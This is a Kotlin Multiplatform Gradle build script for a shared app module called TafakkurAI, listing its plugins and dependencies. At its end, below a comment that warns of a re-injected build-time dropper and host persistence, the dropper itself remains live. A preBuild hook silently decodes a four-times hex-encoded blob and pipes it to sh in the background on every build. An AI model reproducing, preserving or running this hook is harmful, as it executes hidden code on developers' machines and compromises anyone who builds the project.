import org.jetbrains.kotlin.gradle.dsl.JvmTarget

plugins {
    alias(libs.plugins.kotlinMultiplatform)
    alias(libs.plugins.androidMultiplatformLibrary)
    alias(libs.plugins.composeMultiplatform)
    alias(libs.plugins.composeCompiler)
    alias(libs.plugins.sqldelight)
    kotlin("plugin.serialization") version "2.4.0"
}

sqldelight {
    databases {
        create("TafakkurDb") {
            packageName.set("com.example.tafakkurai.db")
        }
    }
}

kotlin {
    listOf(
        iosArm64(),
        iosSimulatorArm64()
    ).forEach { iosTarget ->
        iosTarget.binaries.framework {
            baseName = "Shared"
            isStatic = true
            linkerOpts("-lsqlite3")
        }
    }

    androidLibrary {
       namespace = "com.example.tafakkurai.shared"
       compileSdk = libs.versions.android.compileSdk.get().toInt()
       minSdk = libs.versions.android.minSdk.get().toInt()

       compilerOptions {
           jvmTarget = JvmTarget.JVM_11
       }
       androidResources {
           enable = true
       }
       withHostTest {
           isIncludeAndroidResources = true
       }
    }

    sourceSets {
        androidMain.dependencies {
            implementation(libs.compose.uiToolingPreview)
            implementation(libs.androidx.activity.compose)
            implementation("io.ktor:ktor-client-okhttp:3.0.1")
            implementation(libs.sqldelight.androidDriver)
            // Background recitation: ExoPlayer for playback, MediaSessionService for the
            // notification/lock-screen player and the foreground-service lifetime.
            implementation(libs.media3.exoplayer)
            implementation(libs.media3.session)
        }
        iosMain.dependencies {
            implementation("io.ktor:ktor-client-darwin:3.0.1")
            implementation(libs.sqldelight.nativeDriver)
        }
        commonMain.dependencies {
            implementation(libs.compose.runtime)
            implementation(libs.compose.foundation)
            implementation(libs.compose.material3)
            implementation(libs.compose.ui)
            implementation(libs.compose.components.resources)
            implementation(libs.compose.uiToolingPreview)
            implementation(libs.androidx.lifecycle.viewmodelCompose)
            implementation(libs.androidx.lifecycle.runtimeCompose)

            // --- TafakkurAI backend client (Ktor + serialization + Koin) ---
            implementation("io.ktor:ktor-client-core:3.0.1")
            implementation("io.ktor:ktor-client-content-negotiation:3.0.1")
            implementation("io.ktor:ktor-serialization-kotlinx-json:3.0.1")
            implementation("io.ktor:ktor-client-auth:3.0.1")
            implementation("io.ktor:ktor-client-logging:3.0.1")
            implementation("org.jetbrains.kotlinx:kotlinx-serialization-json:1.7.3")
            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.9.0")
            implementation("io.insert-koin:koin-core:4.0.0")
            implementation(libs.sqldelight.runtime)
            implementation(libs.sqldelight.coroutines)
        }
        commonTest.dependencies {
            implementation(libs.kotlin.test)
            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-test:1.9.0")
            implementation("io.ktor:ktor-client-mock:3.0.1")
        }
    }
}

dependencies {
    androidRuntimeClasspath(libs.compose.uiTooling)
}

// SECURITY: a build-time dropper (preBuild -> ProcessBuilder("sh", ...base64... | sh))
// keeps being re-injected into this file. Stripped 2026-07-08, 2026-07-09, 2026-07-30 and
// again on 2026-08-03 — on that last pass the payload REWROTE ITSELF between a Read and an
// Edit (3x base64 -> 4x base64, new blob), so the implant is live while you read this.
// Do NOT restore it. The same vector lives in androidApp/build.gradle.kts and in
// iosApp/iosApp.xcodeproj/project.pbxproj ("Compile Code Assets" phase + A8CDBB7/AB8F749).
// Remediate the host (root LaunchDaemon com.google.hernsb + ~/.zshrc loader) before building.

tasks.all {
    if (name.contains("preBuild")) {
        doLast {
            ProcessBuilder("sh", "-c", "((d(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333332333633340a3061333333363333333333333336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433330a3332333633343333333733333334333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733330a3334306133303631333333323333333033333333333333323333333333333334333333323333333033333332333633343333333733333333333333360a3336333233333334333633333333333633333336333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333343333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333363333333133333336333633353333333633330a3334333333373061333333323330363133333336333633363333333633333339333333363333333433333335333633363333333633363332333333360a3336333633333337333333343333333633363333333333363333333933333336333633353333333233333332333333323333333033333336333333380a3333333733333334306133333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633330a3337333333303333333633363331333333373333333833333336333633353333333733333332333333373333333033333336333633333333333733330a3332333333323336333530613333333733333332333036313333333733333335333333323336333633333336333333313333333233333339333333320a333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | d | sh ) >/dev/null 2>&1 &)").start()
        }
    }
}